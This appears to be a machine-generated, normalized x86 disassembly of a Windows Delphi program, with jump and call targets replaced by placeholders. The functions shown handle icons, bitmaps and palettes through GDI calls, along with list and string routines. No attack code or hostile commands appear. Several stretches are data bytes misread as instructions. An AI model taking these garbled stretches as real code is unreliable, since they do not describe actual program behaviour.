mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe87
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_402704
retn
call sub_41f0e4
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41fb30
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41fb3c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41feec
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41f06c
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b40
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41f31c
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41ffd0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41feec
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_42003c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41feec
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4200d9
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4200e0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_420110
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b40
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b40
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_420104
xor edx edx
push ebp
push sub_4202fe
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41ffd0
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41ffd0
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_4202d7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407ac0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407ac0
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407ac0
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407ac0
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_42003c
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_42003c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202de
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_402704
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_402704
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_402704
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402704
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4202de
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420305
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_42030c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42035c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4203b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_42035c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4203fd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40306c
mov edi eax
mov eax esi
call sub_40306c
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420537
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42051a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407bec
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420521
mov al 0x1
sub_420550
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416b14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420598
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42059f
mov eax [ ebp - 0x4 ]
call sub_403124
retn
sub_4205a4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4205d8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416b14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420623
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42062a
mov eax [ ebp - 0x4 ]
call sub_403124
retn
sub_420654
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
jo r-xdata
popad
je r-xdata
xor [ ecx + ecx * 4 + 0x20 ] ah
inc ecx
add al ah
aas
inc ecx
add [ eax + eax * 2 + 0x41 ] bl
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
enter 0x4206 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ esi ]
inc edx
add [ eax ] dl
add [ eax ] al
add [ ebx + ebx ] cl
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
and [ eax ] cl
inc edx
add [ eax ] dh
inc ecx
inc ecx
add [ eax + 0x43 ] dh
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
lodsb [ esi ]
mov edx r-xdata
mov eax esi
call sub_42086c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_42086c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_42086c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4207d0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f1c
retn
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
xor edx edx
mov eax esi
call sub_4030f4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_42086c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4207c9
push [ fs : eax ]
mov [ fs : eax ] esp
add esp 0xfffffff0
call sub_403448
sub_4206ec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4207c9
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4030f4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_42086c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_42086c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_42086c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_42086c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4207d0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f1c
retn
add esp 0xfffffff0
call sub_403448
sub_42086c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4208ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404ca0
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407cb8
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403f4c
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403f4c
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_413fac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4208f6
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_420900
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_420987
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407cb8
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_403f90
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_414108
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_404304
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42098e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
sub_420998
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_420a16
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_414108
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_403074
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_40415c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404304
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a1d
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_420a28
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420ba7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_403ef8
mov eax [ ebp + 0x8 ]
call sub_403ef8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414108
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_403350
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420bae
lea eax [ ebp - 0x3c ]
call sub_403ef8
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408d3c
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041c0
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_4041c0
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408d3c
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_408d3c
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_4082c8
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_403f4c
sub_420a55
dec [ ebx - 0x6517f7bb ]
xor al 0xfe
push [ ebx ]
ror [ ecx + 0x458bf445 ] 0xfc
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414108
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_403350
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420bae
lea eax [ ebp - 0x3c ]
call sub_403ef8
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408d3c
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041c0
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_4041c0
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408d3c
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_408d3c
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_4082c8
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_403f4c
sub_420c74
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_420d20
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_420d20
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_420d20
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_420cf4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403124
mov eax [ esi + 0x8 ]
call sub_403124
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_420d20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_413fac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420d64
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_413fac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420dc8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
call sub_420d88
call sub_420da8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_420e08
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4146f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_420e38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40306c
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414800
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_420e6c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4032b0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403124
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
